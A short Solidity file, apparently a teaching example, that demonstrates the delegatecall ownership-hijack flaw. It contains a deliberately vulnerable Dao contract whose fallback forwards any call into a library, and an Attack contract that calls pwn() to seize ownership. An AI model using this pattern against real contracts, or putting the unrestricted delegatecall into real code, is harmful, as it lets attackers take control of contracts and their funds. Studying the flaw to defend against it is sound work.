// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

// Our concern is to change owner
contract Dao {
    address public owner;
    Lib public lib;

    constructor(address _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    Dao dao;

    constructor(address payable _dao) {
        dao = Dao(_dao);
    }

    function exploit() public {
        address(dao).call(abi.encodeWithSignature("pwn()"));
    }
}
